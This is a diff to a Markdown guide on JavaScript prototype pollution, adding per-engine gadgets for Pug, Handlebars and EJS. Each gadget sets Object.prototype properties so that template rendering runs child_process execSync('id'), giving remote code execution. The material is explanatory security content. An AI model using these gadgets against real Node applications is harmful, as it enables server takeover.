@@ -110,16 +110,33 @@ const normalUser = {};  // no own isAdmin property
 checkAdmin(normalUser);  //  true! (inherited from Object.prototype)
 ```
 
-### RCE via Template Engines
-
+#### 1. Pug (formerly Jade)
+**Gadget:** `block` or `line`
 ```javascript
-// Pollution + rendering with Handlebars/Pug/EJS uses Object.prototype as context
-Object.prototype.outputFunctionName = "process.mainModule.require('child_process').execSync('id').toString()";
-
-// When Pug renders any template:
-const html = pug.render('p= name', { name: 'test' });
-//  executes the payload as part of the render context  RCE!
+Object.prototype.block = "process.mainModule.require('child_process').execSync('id')";
+// or
+Object.prototype.line = "process.mainModule.require('child_process').execSync('id')";
 ```
+
+#### 2. Handlebars
+**Gadget:** `type`, `body`
+```javascript
+Object.prototype.type = 'Program';
+Object.prototype.body = [{
+    "type": "MustacheStatement",
+    "path": { "type": "PathExpression", "data": false, "depth": 0, "parts": ["exec"] },
+    "params": [], "hash": null, "escaped": true
+}];
+```
+
+#### 3. EJS (Embedded JavaScript)
+**Gadget:** `client`, `escape`
+```javascript
+Object.prototype.client = true;
+Object.prototype.escape = "process.mainModule.require('child_process').execSync('id')";
+```
+
+---
 
 ### DoS by Breaking Native Operations
 
